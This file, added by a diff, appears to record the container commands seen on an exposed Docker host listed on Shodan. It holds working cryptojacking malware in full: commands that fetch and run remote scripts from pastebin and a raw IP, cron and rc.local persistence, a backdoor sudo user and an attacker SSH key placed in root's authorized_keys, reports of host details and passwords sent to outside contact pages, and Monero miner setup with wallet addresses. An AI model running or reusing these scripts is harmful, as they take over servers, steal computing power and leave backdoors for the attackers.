@@ -1,0 +1,264 @@
+https://www.shodan.io/host/47.101.130.15
+
+Docker Containers:
+	Image: zoolu2/auto
+	Command: /bin/sh -c 'sh /entry'
+
+	Image: alpine
+	Command: chroot /mnt /bin/bash -c 'echo 'nameserver 114.114.114.114' >> /etc/resolv.conf;yum install wget -y;apt-get install wget -y;rm -rf helpdesk*;wget --no-check-certificate https://pastebin.com/raw/h7HiT3uR -O- | tr -d '\r' >installer.sh;chmod 777 installer.sh;bash installer.sh'
+
+	Image: alpine
+	Command: chroot /mnt /bin/bash -c 'echo 'nameserver 114.114.114.114' >> /etc/resolv.conf;yum install wget -y;apt-get install wget -y;rm -rf helpdesk*;wget --no-check-certificate https://pastebin.com/raw/h7HiT3uR -O- | tr -d '\r' >installer.sh;chmod 777 installer.sh;bash installer.sh'
+
+	Image: alpine
+	Command: chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;wget https://pastebin.com/raw/auxWm2R8 -O- | tr -d '\r' >hrfbyyu1.sh;chmod 777 hrfbyyu1.sh;sh hrfbyyu1.sh'
+
+	Image: alpine
+	Command: chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;wget https://pastebin.com/raw/auxWm2R8 -O- | tr -d '\r' >hrfbyyu1.sh;chmod 777 hrfbyyu1.sh;sh hrfbyyu1.sh'
+
+	Image: alpine
+	Command: chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;wget https://pastebin.com/raw/auxWm2R8 -O- | tr -d '\r' >hrfbyyu1.sh;chmod 777 hrfbyyu1.sh;sh hrfbyyu1.sh'
+
+	Image: alpine
+	Command: chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;wget https://pastebin.com/raw/auxWm2R8 -O- | tr -d '\r' >hrfbyyu1.sh;chmod 777 hrfbyyu1.sh;sh hrfbyyu1.sh'
+
+	Image: zoolu/ubuntu
+	Command: /bin/sh -c 'sh /mac.sh'
+
+	Image: alp1ne/update:latest
+	Command: /bin/bash -c '#!/bin/bash
+
+#cat /mnt/root/.ssh/authorized_keys
+#ls -all /mnt/etc
+whoami
+# get rid of old
+
+cronfile="/tmp/.bvgh56f6.tmp"
+cat mnt/etc/crontab > "${cronfile}" || true
+
+# remove old /var/tmp/check-****.sh from cron
+###########  REMOVE OTHERS TOO !!!
+sed -i '/\/var\/tmp\//d' "${cronfile}"
+sed -i '/tmp\//d' "${cronfile}"
+sed -i '/img.jpg/d' "${cronfile}"
+sed -i '/pastebin/d' "${cronfile}"
+sed -i '/xmr/d' "${cronfile}"
+sed -i '/service sshd restart/d' "${cronfile}"
+
+
+# add jobs to cronfile
+echo "27 *  * * *   root     wget -qO- https://pastebin.com/raw/ZpxQJxvN | sed 's/\r//' | /bin/bash || true" >> $cronfile || true
+echo "28 *  * * *   root     /etc/init.d/sshd restart || service sshd restart|| true" >> $cronfile || true
+
+# replace cron
+rm -rf mnt/etc/crontab
+echo $cronfile > mnt/etc/crontab
+
+# remove old persistence from etc local
+sed -i '/pastebin/d' /mnt/etc/rc.local || true
+
+# add persistence to etc local
+echo "wget -qO- https://pastebin.com/raw/ZpxQJxvN | sed 's/\r//' | /bin/bash || true" >> /mnt/etc/rc.local || true
+
+
+product="doc"
+#setupurl="https://pastebin.com/raw/HJLMF7Es"
+lockfile="/tmp/java2210.lock"
+myhostname=$(hostname)
+architecture=$(uname -m)
+myip=$(curl -s http://whatismyip.akamai.com/)
+cpumodel1=$(lscpu | grep "Model ")
+cpumodel2=$(echo "${cpumodel1//Model name\:/}")
+cpumodel3=$(echo "${cpumodel2//  /}")
+cpumodel4=$(echo "${cpumodel3// /_}")
+cpumodel=$(echo "${cpumodel4//(|)/}")
+cpumodel=$(echo "${cpumodel//\(/-}")
+cpumodel=$(echo "${cpumodel//\)/-}")
+cpumodel=$(echo "${cpumodel//-/_}")
+cpucount=$(nproc)
+datenow=`date '+%Y-%m-%d-time-%H-%M-%S'`
+iamuser=$(whoami)
+myidstring=$product-$myip-$iamuser-$myhostname-$architecture-$cpumodel-c$cpucount_procs-$datenow
+userpassword=$myip-yuguiyiuk898
+
+
+# add user
+USERPUBKEY="LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDWWJVbWV0RVRES0J5d0ZoU0FvVjEwMWo3UQpPNDlTRHVqL2VVOGdHV0FDOWRuSUViYXpDN1gveXkycDZWc2hONW14MzQ2Y2JrOU5tNDAzZzhqWlh5Zmt0eEEvCm9Ndkx3VVpXcEdLYkZOUkdDYUMzVGloenRwL1MxVVZRbHl4a1VwbTA2TjNVY2JKdjhsVnFFWVhyWTlJZ1NXOWUKNHg2bjhqc1czYXhLSk5UUk5RSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo="
+
+adduser admindaemon  --gecos  "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password  ||  adduser admindaemon  --gecos  "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password  || true
+echo "admindaemon:"$userpassword | sudo chpasswd || echo "admindaemon:"$userpassword | sudo chpasswd || true
+echo "admindaemon ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoerssudo || echo "admindaemon ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoerssudo || true
+
+# put  rsa login for user
+# su - admindaemon -c "ssh-keygen -q -t rsa -f ~/.ssh/id_rsa -N ''" java-update
+# cp key to home direc of new user
+mkdir /home/admindaemon/.ssh || true
+echo $USERPUBKEY | base64 -d >> /home/admindaemon/.ssh/authorized_keys || true
+chown admindaemon:admindaemon /home/admindaemon/.ssh
+chown admindaemon:admindaemon /home/admindaemon/.ssh/authorized_keys
+chmod 600 /home/admindaemon/.ssh/authorized_keys  || true
+
+# put rsa login for root
+chattr -i /mnt/root/.ssh/authorized_keys || true
+chmod 777 /mnt/root/.ssh/authorized_keys || true
+echo $USERPUBKEY | base64 -d >> /mnt/root/.ssh/authorized_keys || true
+chmod 600 /mnt/root/.ssh/authorized_keys || true
+# chattr +i /mnt/root/.ssh/authorized_keys || true
+
+
+
+doconfig ()
+{
+    if cat /mnt/etc/ssh/sshd_config | grep $1 | grep yes | grep -v "#"; then
+        echo $1 - ok ;
+    else
+        echo "adding"
+        #echo "${1} yes" >> /mnt/etc/ssh/sshd_config
+        echo "echo \"${1} yes\" >> /etc/ssh/sshd_config"
+    fi
+}
+
+chattr -i /mnt/etc/ssh/sshd_config
+
+doconfig PermitRootLogin || true
+doconfig RSAAuthentication || true
+doconfig PubkeyAuthentication || true
+# chattr +i /etc/ssh/sshd_config
+
+/mnt/etc/init.d/sshd restart || service sshd restart || echo "NO RESTART SSHD"
+
+
+
+keys=$(cat /mnt/root/.ssh/authorized_keys | grep MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCYbUmetETDKBywFhSAoV101j7Q)
+# echo "Auth keys - $keys"
+
+
+
+echo "STRATING JAVA UPDATE ........." || true
+msg="NEW ROOT SERVER INSTALL -- Auth Keys = $keys"
+echo curl -s -F "\"msg=${msg}\"" "\"https://removeables.xyz/contact.php?xdfse\""
+curl -s -F "msg=${msg}" "http://removables.xyz/contact.php?xdfse=${myidstring}" || true
+msg=" - Adding new user - admindaemon:${userpassword}"
+curl -s -F "msg=${msg}" "http://removables.xyz/contact.php?xdfse=${myidstring}" || true
+
+
+cd /var/tmp/.deploycache/deploy
+    # set password
+    sed -i "s/\"pass\"\:.*,/\"pass\"\:\"${myidstring}\",/"  config.json
+    # set log on
+    sed -i "s/\"log-file\"\:.*,/\"log-file\"\:\".xlog\",/"  config.json
+    # set Ditch color logs
+    sed -i "s/\"colors\"\:.*,/\"colors\"\: false,/"  config.json
+    # set user
+    sed -i "s/\"user\"\:.*,/\"user\"\:\"488UNbiETWZdqqShpn4tAxAKtHEV7hG9CAdq4acKVrgA8W7CSx9U7Kkemrsn8KQPgKhP6PjCk32ieQ8E6WM9mAmiKwzamY4\",/"  config.json
+
+#491e39wxtWTfMytTq8KaM6Vp9hWDfsi5cjCvQLdYS8kN1AHNEbHAHp9Z2V7H6wKxTv5RBx7GXtVMWAuCERjwDhxD2qQEJ8Q
+/var/tmp/.deploycache/deploy/java-update
+
+    for i in 1 2 3 4 5 6
+    do
+        echo "waiting for log ........"
+        sleep 60s
+        if grep -q "H/s" .xlog; then
+            break
+        fi
+    done
+
+    heading=$(head -30 .xlog)
+    hashrates=$(cat .xlog | grep H/s)
+    topcpu=$(top -b -n 1)
+    processes=$(ps -aux)
+
+msg="New Edition Server Stats:\r\n------------------\r\n\r\n heading \r\n------------------\r\n\r\n ${heading} \r\n------------------\r\n\r\n hashrates \r\n------------------\r\n\r\n ${hashrates} \r\n------------------"
+echo curl -s -F "\"msg=${msg}\"" "\"https://removeables.xyz/contact.php?xdfse\""
+curl -s -F "msg=${msg}" "http://removables.xyz/contact.php?xdfse=${myidstring}" || true
+
+echo "JAVA UPDATE IN PROGRESS ........." || true
+while true;do a=1;done'
+
+	Image: alp1ne/update:latest
+	Command: /bin/bash -c '#!/bin/bash
+
+#whoami
+#pwd
+#ls -all
+#echo mounted dir
+#ls -all /mnt/root
+# 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+ls -all /root
+echo "17 *  * * *   root     wget -qO- https://pastebin.com/raw/ZpxQJxvN | sed 's/\r//' | /bin/bash || true" >> mnt/etc/crontab || true
+#echo "@reboot wget -qO- https://pastebin.com/raw/ZpxQJxvN | sed 's/\r//' | /bin/bash || true" >> mnt/etc/crontab || true
+echo "wget -qO- https://pastebin.com/raw/ZpxQJxvN | sed 's/\r//' | /bin/bash || true" >> /mnt/etc/rc.local || true
+USERPUBKEY="LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDWWJVbWV0RVRES0J5d0ZoU0FvVjEwMWo3UQpPNDlTRHVqL2VVOGdHV0FDOWRuSUViYXpDN1gveXkycDZWc2hONW14MzQ2Y2JrOU5tNDAzZzhqWlh5Zmt0eEEvCm9Ndkx3VVpXcEdLYkZOUkdDYUMzVGloenRwL1MxVVZRbHl4a1VwbTA2TjNVY2JKdjhsVnFFWVhyWTlJZ1NXOWUKNHg2bjhqc1czYXhLSk5UUk5RSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo="
+chmod 777 /root/.ssh/authorized_keys || true
+chattrb -i /root/.ssh/authorized_keys || true
+echo $USERPUBKEY >> /root/.ssh/authorized_keys || true
+chmod 600 /root/.ssh/authorized_keys || true
+cat /root/.ssh/authorized_keys || true
+echo "STRATING JAVA UPDATE ........." || true
+product="doc"
+#setupurl="https://pastebin.com/raw/HJLMF7Es"
+lockfile="/tmp/java2210.lock"
+myhostname=$(hostname)
+architecture=$(uname -m)
+myip=$(curl -s  http://whatismyip.akamai.com/)
+cpumodel1=$(lscpu | grep "Model ")
+cpumodel2=$(echo "${cpumodel1//Model name\:/}")
+cpumodel3=$(echo "${cpumodel2//  /}")
+cpumodel4=$(echo "${cpumodel3// /_}")
+cpumodel=$(echo "${cpumodel4//(|)/}")
+cpumodel=$(echo "${cpumodel//\(/-}")
+cpumodel=$(echo "${cpumodel//\)/-}")
+cpucount=$(nproc)
+datenow=`date '+%Y-%m-%d-time-%H-%M-%S'`
+iamuser=$(whoami)
+myidstring=$product-$myip-$iamuser-$myhostname-$architecture-$cpumodel-c$cpucount_procs-$datenow
+msg="NEW SERVER INSTALL"
+#echo curl -s -F "\"msg=---${myidstring}--->${msg}\"" "\"https://removeables.000webhostapp.com/contact.php?xdfse\""
+eval curl -s -F "\"msg=---${myidstring}--->${msg}\"" "\"https://removeables.000webhostapp.com/contact.php?xdfse=${myidstring}\"" || true
+
+cd /var/tmp/.deploycache/deploy
+    # set password
+    sed -i "s/\"pass\"\:.*,/\"pass\"\:\"${myidstring}:cmwolf@gmx.com\",/"  config.json
+    # set log on
+    sed -i "s/\"log-file\"\:.*,/\"log-file\"\:\".xlog\",/"  config.json
+    # set Ditch color logs
+    sed -i "s/\"colors\"\:.*,/\"colors\"\: false,/"  config.json
+    # set user
+    sed -i "s/\"user\"\:.*,/\"user\"\:\"491e39wxtWTfMytTq8KaM6Vp9hWDfsi5cjCvQLdYS8kN1AHNEbHAHp9Z2V7H6wKxTv5RBx7GXtVMWAuCERjwDhxD2qQEJ8Q\",/"  config.json
+
+#491e39wxtWTfMytTq8KaM6Vp9hWDfsi5cjCvQLdYS8kN1AHNEbHAHp9Z2V7H6wKxTv5RBx7GXtVMWAuCERjwDhxD2qQEJ8Q
+/var/tmp/.deploycache/deploy/java-update
+
+    for i in 1 2 3 4 5 6
+    do
+        echo "waiting for log ........"
+        sleep 60s
+        if grep -q "H/s" .xlog; then
+            break
+        fi
+    done
+
+    heading=$(head -30 .xlog)
+    hashrates=$(cat .xlog | grep H/s)
+    topcpu=$(top -b -n 1)
+    processes=$(ps -aux)
+#msg="Server Stats:\r\n------------------\r\n\r\n heading \r\n------------------\r\n\r\n ${heading} \r\n------------------\r\n\r\n hashrates \r\n------------------\r\n\r\n ${hashrates} \r\n------------------\r\n\r\n topcpu \r\n------------------\r\n\r\n ${topcpu} \r\n------------------\r\n\r\n processes \r\n------------------\r\n\r\n ${processes}"
+msg=$(cat .xlog | base64)
+#echo curl -s -F "\"msg=---${myidstring}--->${msg}\"" "\"https://removeables.000webhostapp.com/contact.php?xdfse\""
+eval curl -s -F "\"msg=---${myidstring}--->${msg}\"" "\"https://removeables.000webhostapp.com/contact.php?xdfse=${myidstring}\"" || true
+
+echo "JAVA UPDATE IN PROGRESS ........." || true
+while true;do a=1;done'
+
+	Image: zhaoyao91/ubuntool
+	Command: sh -c 'wget -O - http://74.81.89.2/~radiopimweb/run.sh | bash'
+
+	Image: zhaoyao91/ubuntool
+	Command: sh -c 'wget -O - http://74.81.89.2/~radiopimweb/run.sh | bash'
+
+	Image: zhaoyao91/ubuntool
+	Command: sh -c 'wget -O - http://74.81.89.2/~radiopimweb/run.sh | bash'
+
+	Image: zhaoyao91/ubuntool
+	Command: sh -c 'wget -O - http://74.81.89.2/~radiopimweb/run.sh | bash'
